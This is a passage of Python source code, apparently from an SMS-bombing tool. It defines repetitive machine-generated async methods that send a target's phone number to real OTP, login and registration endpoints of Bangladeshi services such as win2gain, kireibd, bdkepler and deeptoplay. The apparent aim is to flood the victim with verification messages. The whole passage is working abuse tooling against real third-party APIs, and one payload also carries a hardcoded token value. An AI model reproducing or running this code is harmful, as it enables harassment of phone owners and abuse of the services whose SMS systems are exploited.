        url = "https://ali2bd-api.service.moveon.global/api/consumer/v1/auth/login"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL004 ali2bd-api.service.moveon.global": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL004 ali2bd-api.service.moveon.global": pass
            elif "Bioscope" in "CURL004 ali2bd-api.service.moveon.global": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL004 ali2bd-api.service.moveon.global": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL004 ali2bd-api.service.moveon.global": payload = {"phone": target}
            elif "Medha" in "CURL004 ali2bd-api.service.moveon.global": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL004 ali2bd-api.service.moveon.global": payload = {"number": "+88" + target}
            elif "Robi" in "CURL004 ali2bd-api.service.moveon.global": payload = {"phone_number": target}
            elif "Arogga" in "CURL004 ali2bd-api.service.moveon.global": payload = {"mobile": target}
            elif "MyGP" in "CURL004 ali2bd-api.service.moveon.global": pass
            elif "BDSTall" in "CURL004 ali2bd-api.service.moveon.global": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL004 ali2bd-api.service.moveon.global": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL004 ali2bd-api.service.moveon.global": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL004 ali2bd-api.service.moveon.global": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL004 ali2bd-api.service.moveon.global": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL004 ali2bd-api.service.moveon.global": payload = {"mobile": target}
            elif "Kirei" in "CURL004 ali2bd-api.service.moveon.global": payload = {"phone": target}
            elif "Shikho" in "CURL004 ali2bd-api.service.moveon.global": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL004 ali2bd-api.service.moveon.global": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL004 ali2bd-api.service.moveon.global", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL004 ali2bd-api.service.moveon.global", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL004 ali2bd-api.service.moveon.global", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl005_api_apex4u_com(self):
        target = self.target
        url = "https://api.apex4u.com/api/auth/login"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL005 api.apex4u.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL005 api.apex4u.com": pass
            elif "Bioscope" in "CURL005 api.apex4u.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL005 api.apex4u.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL005 api.apex4u.com": payload = {"phone": target}
            elif "Medha" in "CURL005 api.apex4u.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL005 api.apex4u.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL005 api.apex4u.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL005 api.apex4u.com": payload = {"mobile": target}
            elif "MyGP" in "CURL005 api.apex4u.com": pass
            elif "BDSTall" in "CURL005 api.apex4u.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL005 api.apex4u.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL005 api.apex4u.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL005 api.apex4u.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL005 api.apex4u.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL005 api.apex4u.com": payload = {"mobile": target}
            elif "Kirei" in "CURL005 api.apex4u.com": payload = {"phone": target}
            elif "Shikho" in "CURL005 api.apex4u.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL005 api.apex4u.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL005 api.apex4u.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL005 api.apex4u.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL005 api.apex4u.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl006_api_bdkepler_com(self):
        target = self.target
        url = "https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL006 api.bdkepler.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL006 api.bdkepler.com": pass
            elif "Bioscope" in "CURL006 api.bdkepler.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL006 api.bdkepler.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL006 api.bdkepler.com": payload = {"phone": target}
            elif "Medha" in "CURL006 api.bdkepler.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL006 api.bdkepler.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL006 api.bdkepler.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL006 api.bdkepler.com": payload = {"mobile": target}
            elif "MyGP" in "CURL006 api.bdkepler.com": pass
            elif "BDSTall" in "CURL006 api.bdkepler.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL006 api.bdkepler.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL006 api.bdkepler.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL006 api.bdkepler.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL006 api.bdkepler.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL006 api.bdkepler.com": payload = {"mobile": target}
            elif "Kirei" in "CURL006 api.bdkepler.com": payload = {"phone": target}
            elif "Shikho" in "CURL006 api.bdkepler.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL006 api.bdkepler.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL006 api.bdkepler.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL006 api.bdkepler.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL006 api.bdkepler.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl007_api_bdkepler_com(self):
        target = self.target
        url = "https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL007 api.bdkepler.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL007 api.bdkepler.com": pass
            elif "Bioscope" in "CURL007 api.bdkepler.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL007 api.bdkepler.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL007 api.bdkepler.com": payload = {"phone": target}
            elif "Medha" in "CURL007 api.bdkepler.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL007 api.bdkepler.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL007 api.bdkepler.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL007 api.bdkepler.com": payload = {"mobile": target}
            elif "MyGP" in "CURL007 api.bdkepler.com": pass
            elif "BDSTall" in "CURL007 api.bdkepler.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL007 api.bdkepler.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL007 api.bdkepler.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL007 api.bdkepler.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL007 api.bdkepler.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL007 api.bdkepler.com": payload = {"mobile": target}
            elif "Kirei" in "CURL007 api.bdkepler.com": payload = {"phone": target}
            elif "Shikho" in "CURL007 api.bdkepler.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL007 api.bdkepler.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL007 api.bdkepler.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL007 api.bdkepler.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL007 api.bdkepler.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl008_www_daktare_com(self):
        target = self.target
        url = "https://www.daktare.com/login/mobile"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL008 www.daktare.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL008 www.daktare.com": pass
            elif "Bioscope" in "CURL008 www.daktare.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL008 www.daktare.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL008 www.daktare.com": payload = {"phone": target}
            elif "Medha" in "CURL008 www.daktare.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL008 www.daktare.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL008 www.daktare.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL008 www.daktare.com": payload = {"mobile": target}
            elif "MyGP" in "CURL008 www.daktare.com": pass
            elif "BDSTall" in "CURL008 www.daktare.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL008 www.daktare.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL008 www.daktare.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL008 www.daktare.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL008 www.daktare.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL008 www.daktare.com": payload = {"mobile": target}
            elif "Kirei" in "CURL008 www.daktare.com": payload = {"phone": target}
            elif "Shikho" in "CURL008 www.daktare.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL008 www.daktare.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL008 www.daktare.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL008 www.daktare.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL008 www.daktare.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl009_api_deeptoplay_com(self):
        target = self.target
        url = "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL009 api.deeptoplay.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL009 api.deeptoplay.com": pass
            elif "Bioscope" in "CURL009 api.deeptoplay.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL009 api.deeptoplay.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL009 api.deeptoplay.com": payload = {"phone": target}
            elif "Medha" in "CURL009 api.deeptoplay.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL009 api.deeptoplay.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL009 api.deeptoplay.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL009 api.deeptoplay.com": payload = {"mobile": target}
            elif "MyGP" in "CURL009 api.deeptoplay.com": pass
            elif "BDSTall" in "CURL009 api.deeptoplay.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL009 api.deeptoplay.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL009 api.deeptoplay.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL009 api.deeptoplay.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL009 api.deeptoplay.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL009 api.deeptoplay.com": payload = {"mobile": target}
            elif "Kirei" in "CURL009 api.deeptoplay.com": payload = {"phone": target}
            elif "Shikho" in "CURL009 api.deeptoplay.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL009 api.deeptoplay.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL009 api.deeptoplay.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL009 api.deeptoplay.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL009 api.deeptoplay.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl010_api_garibookadmin_com(self):
        target = self.target
        url = "https://api.garibookadmin.com/api/v4/user/login"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL010 api.garibookadmin.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL010 api.garibookadmin.com": pass
            elif "Bioscope" in "CURL010 api.garibookadmin.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL010 api.garibookadmin.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL010 api.garibookadmin.com": payload = {"phone": target}
            elif "Medha" in "CURL010 api.garibookadmin.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL010 api.garibookadmin.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL010 api.garibookadmin.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL010 api.garibookadmin.com": payload = {"mobile": target}
            elif "MyGP" in "CURL010 api.garibookadmin.com": pass
            elif "BDSTall" in "CURL010 api.garibookadmin.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL010 api.garibookadmin.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL010 api.garibookadmin.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL010 api.garibookadmin.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL010 api.garibookadmin.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL010 api.garibookadmin.com": payload = {"mobile": target}
            elif "Kirei" in "CURL010 api.garibookadmin.com": payload = {"phone": target}
            elif "Shikho" in "CURL010 api.garibookadmin.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL010 api.garibookadmin.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL010 api.garibookadmin.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL010 api.garibookadmin.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL010 api.garibookadmin.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl011_api_hishabpati_com(self):
        target = self.target
        url = "https://api.hishabpati.com/api/v1/merchant/register/otp/v2"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL011 api.hishabpati.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL011 api.hishabpati.com": pass
            elif "Bioscope" in "CURL011 api.hishabpati.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL011 api.hishabpati.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL011 api.hishabpati.com": payload = {"phone": target}
            elif "Medha" in "CURL011 api.hishabpati.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL011 api.hishabpati.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL011 api.hishabpati.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL011 api.hishabpati.com": payload = {"mobile": target}
            elif "MyGP" in "CURL011 api.hishabpati.com": pass
            elif "BDSTall" in "CURL011 api.hishabpati.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL011 api.hishabpati.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL011 api.hishabpati.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL011 api.hishabpati.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL011 api.hishabpati.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL011 api.hishabpati.com": payload = {"mobile": target}
            elif "Kirei" in "CURL011 api.hishabpati.com": payload = {"phone": target}
            elif "Shikho" in "CURL011 api.hishabpati.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL011 api.hishabpati.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL011 api.hishabpati.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL011 api.hishabpati.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL011 api.hishabpati.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl012_api_toybox_live(self):
        target = self.target
        url = "https://api.toybox.live/bdapps_handler.php"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL012 api.toybox.live": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL012 api.toybox.live": pass
            elif "Bioscope" in "CURL012 api.toybox.live": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL012 api.toybox.live": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL012 api.toybox.live": payload = {"phone": target}
            elif "Medha" in "CURL012 api.toybox.live": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL012 api.toybox.live": payload = {"number": "+88" + target}
            elif "Robi" in "CURL012 api.toybox.live": payload = {"phone_number": target}
            elif "Arogga" in "CURL012 api.toybox.live": payload = {"mobile": target}
            elif "MyGP" in "CURL012 api.toybox.live": pass
            elif "BDSTall" in "CURL012 api.toybox.live": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL012 api.toybox.live": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL012 api.toybox.live": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL012 api.toybox.live": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL012 api.toybox.live": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL012 api.toybox.live": payload = {"mobile": target}
            elif "Kirei" in "CURL012 api.toybox.live": payload = {"phone": target}
            elif "Shikho" in "CURL012 api.toybox.live": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL012 api.toybox.live": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL012 api.toybox.live", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL012 api.toybox.live", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL012 api.toybox.live", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl013_api_win2gain_com(self):
        target = self.target
        url = "https://api.win2gain.com/api/Users/IsUserLogin?msisdn=880{phone}"
        method = "GET"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL013 api.win2gain.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL013 api.win2gain.com": pass
            elif "Bioscope" in "CURL013 api.win2gain.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL013 api.win2gain.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL013 api.win2gain.com": payload = {"phone": target}
            elif "Medha" in "CURL013 api.win2gain.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL013 api.win2gain.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL013 api.win2gain.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL013 api.win2gain.com": payload = {"mobile": target}
            elif "MyGP" in "CURL013 api.win2gain.com": pass
            elif "BDSTall" in "CURL013 api.win2gain.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL013 api.win2gain.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL013 api.win2gain.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL013 api.win2gain.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL013 api.win2gain.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL013 api.win2gain.com": payload = {"mobile": target}
            elif "Kirei" in "CURL013 api.win2gain.com": payload = {"phone": target}
            elif "Shikho" in "CURL013 api.win2gain.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL013 api.win2gain.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL013 api.win2gain.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL013 api.win2gain.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL013 api.win2gain.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl014_api_win2gain_com(self):
        target = self.target
        url = "https://api.win2gain.com/api/Users/RequestOtp?msisdn=880{phone}&otpEvent=SignUp"
        method = "GET"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL014 api.win2gain.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL014 api.win2gain.com": pass
            elif "Bioscope" in "CURL014 api.win2gain.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL014 api.win2gain.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL014 api.win2gain.com": payload = {"phone": target}
            elif "Medha" in "CURL014 api.win2gain.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL014 api.win2gain.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL014 api.win2gain.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL014 api.win2gain.com": payload = {"mobile": target}
            elif "MyGP" in "CURL014 api.win2gain.com": pass
            elif "BDSTall" in "CURL014 api.win2gain.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL014 api.win2gain.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL014 api.win2gain.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL014 api.win2gain.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL014 api.win2gain.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL014 api.win2gain.com": payload = {"mobile": target}
            elif "Kirei" in "CURL014 api.win2gain.com": payload = {"phone": target}
            elif "Shikho" in "CURL014 api.win2gain.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL014 api.win2gain.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL014 api.win2gain.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL014 api.win2gain.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL014 api.win2gain.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl015_frontendapi_kireibd_com(self):
        target = self.target
        url = "https://frontendapi.kireibd.com/api/v2/send-login-otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL015 frontendapi.kireibd.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL015 frontendapi.kireibd.com": pass
            elif "Bioscope" in "CURL015 frontendapi.kireibd.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL015 frontendapi.kireibd.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL015 frontendapi.kireibd.com": payload = {"phone": target}
            elif "Medha" in "CURL015 frontendapi.kireibd.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL015 frontendapi.kireibd.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL015 frontendapi.kireibd.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL015 frontendapi.kireibd.com": payload = {"mobile": target}
            elif "MyGP" in "CURL015 frontendapi.kireibd.com": pass
            elif "BDSTall" in "CURL015 frontendapi.kireibd.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL015 frontendapi.kireibd.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL015 frontendapi.kireibd.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL015 frontendapi.kireibd.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL015 frontendapi.kireibd.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL015 frontendapi.kireibd.com": payload = {"mobile": target}
